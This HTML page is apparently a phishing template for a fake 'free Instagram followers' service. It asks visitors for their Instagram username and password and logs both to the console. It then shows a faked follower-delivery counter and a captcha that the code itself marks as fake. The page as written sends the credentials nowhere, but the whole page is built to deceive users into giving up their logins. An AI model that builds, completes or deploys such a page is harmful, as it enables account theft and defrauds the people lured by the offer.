<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Free Followers Generator</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background:
        linear-gradient(rgba(131, 58, 180, 0.7), rgba(253, 29, 29, 0.7), rgba(252, 176, 69, 0.7)),
        url('https://images.unsplash.com/photo-1515377905703-c4788e51af15?auto=format&fit=crop&w=1470&q=80') no-repeat center center fixed;
      background-size: cover;
      color: white;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      backdrop-filter: blur(3px);
    }

    nav {
      background-color: rgba(0, 123, 255, 0.85);
      color: white;
      padding: 1em 2em;
      text-align: center;
      font-size: 20px;
      font-weight: bold;
      user-select: none;
      letter-spacing: 1px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
    }

    main {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 2rem 1rem;
      max-width: 480px;
      margin: 0 auto;
      text-align: center;
      background-color: rgba(0,0,0,0.3);
      border-radius: 12px;
      box-shadow: 0 0 40px rgba(0,0,0,0.7);
    }

    h2 {
      margin-bottom: 1rem;
      font-weight: 700;
      font-size: 2.2rem;
      text-shadow: 0 0 8px rgba(0,0,0,0.7);
    }

    p {
      margin-bottom: 1.5rem;
      font-size: 1.1rem;
      color: #eee;
      text-shadow: 0 0 4px rgba(0,0,0,0.7);
    }

    input[type="number"],
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px 12px;
      margin-bottom: 1.5rem;
      font-size: 1rem;
      border-radius: 8px;
      border: none;
      outline: none;
      box-sizing: border-box;
      background-color: rgba(255 255 255 / 0.9);
      color: #222;
      font-weight: 600;
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
    }
    input[type="number"]:focus,
    input[type="text"]:focus,
    input[type="password"]:focus {
      background-color: #fff;
      box-shadow: 0 0 8px #007bff;
    }

    button,
    input[type="submit"] {
      width: 100%;
      padding: 16px 0;
      font-size: 1.2rem;
      font-weight: 700;
      color: white;
      background-color: #007bff;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      user-select: none;
      box-shadow: 0 4px 12px rgba(0,123,255,0.6);
    }
    button:hover,
    input[type="submit"]:hover {
      background-color: #0056b3;
      box-shadow: 0 6px 16px rgba(0,86,179,0.8);
    }

    #message {
      margin-top: 1.5rem;
      font-size: 1.1rem;
      font-weight: 600;
      color: #00ff90;
      text-shadow: 0 0 6px rgba(0,255,144,0.8);
    }

    #verificationStep {
      margin-top: 2rem;
      display: none;
    }

    .captcha-box {
      border: 2px dashed #00ff90;
      padding: 18px;
      background-color: rgba(0, 255, 144, 0.15);
      border-radius: 12px;
      font-weight: 700;
      letter-spacing: 1px;
      color: #00ff90;
      user-select: none;
      box-shadow: 0 0 10px #00ff90;
    }

    @media (max-width: 520px) {
      main {
        max-width: 95vw;
        padding: 1.5rem 1rem;
      }
      h2 {
        font-size: 1.8rem;
      }
      button,
      input[type="submit"] {
        font-size: 1rem;
        padding: 14px 0;
      }
    }
  </style>
</head>
<body>
  <nav>üåü InstaBoost - Free Followers Tool</nav>
  <main>
    <!-- Step 1: Enter follower amount -->
    <div id="introSection">
      <h2>Get Free Instagram Followers</h2>
      <p>Enter the number of followers you want:</p>
      <input
        type="number"
        id="followerCount"
        placeholder="e.g. 1000"
        min="1"
        required
        style="font-weight: 700; font-size: 1rem; padding: 12px;"
      />
      <button onclick="showLoginForm()">Continue</button>
    </div>

    <!-- Step 2: Login form -->
    <form id="loginForm" style="display: none;">
      <p>Please add your Instagram username and password:</p>
      <input type="text" id="username" placeholder="Instagram Username" required autocomplete="off" />
      <input type="password" id="password" placeholder="Instagram Password" required autocomplete="off" />
      <input type="submit" value="Start Boost" />
    </form>

    <!-- Step 3: Progress message -->
    <div id="message"></div>

    <!-- Step 4: Fake Human Verification -->
    <div id="verificationStep">
      <div class="captcha-box">
        <p>‚ö†Ô∏è Please verify you're not a robot</p>
        <button onclick="completeHumanVerification()">Verify</button>
      </div>
    </div>
  </main>

  <script>
    function showLoginForm() {
      const followerCountInput = document.getElementById("followerCount");
      const value = parseInt(followerCountInput.value);

      if (!value || value < 1) {
        alert("Please enter a valid number of followers (1 or more).");
        followerCountInput.focus();
        return;
      }

      document.getElementById("introSection").style.display = "none";
      document.getElementById("loginForm").style.display = "block";
    }

    const loginForm = document.getElementById("loginForm");
    const message = document.getElementById("message");
    const verificationStep = document.getElementById("verificationStep");

    loginForm.addEventListener("submit", function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const followerCount = parseInt(document.getElementById("followerCount").value);

      if (!username || !password) {
        alert("Please enter your Instagram username and password.");
        return;
      }

      console.log("Username:", username);
      console.log("Password:", password);

      loginForm.style.display = "none";
      message.style.color = "#00ff90";
      let count = 0;

      message.textContent = `Starting delivery of ${followerCount.toLocaleString()} followers to @${username}...`;

      const interval = setInterval(() => {
        const step = Math.floor(Math.random() * 400 + 250);
        count += step;

        if (count >= followerCount) {
          count = followerCount;
          clearInterval(interval);
          message.textContent = `‚úÖ Added ${count.toLocaleString()} followers to @${username}!`;
          setTimeout(() => {
            message.textContent = '';
            verificationStep.style.display = 'block';
          }, 1500);
        } else {
          message.textContent = `Adding followers... ${count.toLocaleString()} / ${followerCount.toLocaleString()}`;
        }
      }, 300);
    });

    function completeHumanVerification() {
      alert("‚úÖ Verified! Your followers will appear shortly.");
      verificationStep.innerHTML = `<p style="color:#00ff90;font-weight:bold;">You're all set! ‚úÖ</p>`;
    }
  </script>
</body>
</html>
